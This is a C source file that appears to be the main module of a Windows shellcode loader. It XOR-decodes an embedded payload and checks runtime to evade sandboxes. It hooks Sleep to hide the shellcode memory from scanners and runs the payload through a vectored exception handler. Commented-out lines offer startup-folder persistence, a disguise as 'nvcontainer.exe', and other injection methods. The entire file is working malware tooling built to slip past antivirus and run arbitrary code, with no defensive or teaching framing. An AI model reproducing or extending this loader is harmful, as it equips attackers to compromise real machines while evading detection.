#include<stdio.h>
#include<Windows.h>
#include"CodeInject.h"
#include"AutoRun.h"
#include"AntiSandbox.h"
#include"Loader.h"
#include"shellcode.h"
#include"MyHook.h"


void XORrecoder(unsigned char* buffer)
{
	for (size_t i = 0; i < size; i++)
	{
#ifdef ENCODE
		buffer[i] ^= KEY;
		printf("0x%02x,", buffer[i]);
#endif
		buffer[i] ^= KEY;
		//printf("0x%02x,", shellcode[i]);
	}
	putchar('\n');
}

CInlineHook MyHookObj;

VOID WINAPI DetourSleep(_In_ DWORD dwMilliseconds)
{
	DWORD OldProtect = 0;

    MyHookObj.UnHook64();

	XORrecoder(shellcode);
	VirtualProtect(shellcode, 0x1000, PAGE_NOACCESS, &OldProtect);
	Sleep(dwMilliseconds);
	VirtualProtect(shellcode, 0x1000, PAGE_EXECUTE_READWRITE, &OldProtect);
	XORrecoder(shellcode);

    MyHookObj.ReHook64();
}


void delay()
{
	for (register int i = 0; i < 0xFFFFFF*5; ++i)
		Sleep(0);
}


int main()
{
#ifdef ENCODE
	XORrecoder(shellcode);

#else
	//AutoRun::StartUpFloderAutoRun(NULL, MyName);	//×ÔÆô¶¯

	//CHAR MyName[MAX_PATH] = "nvcontainer.exe";
	//AntiSandbox::AntiSandboxByName(MyName);
	AntiSandbox::AntiSandboxByRuntime();

	delay();
	
	MyHookObj.Hook64("KERNEL32.DLL", "Sleep", (PROC)DetourSleep);

	XORrecoder(shellcode);
	//Loader::RunShellCode_1(shellcode);
	//Loader::RunShellCode_2(shellcode);
	//Loader::InjectShellCode_1(shellcode);
	//Loader::CertEnumSystemStoreCallbackRunShellcode(shellcode);
	Loader::VehRunShellcode(shellcode);

#endif

	return 0;
}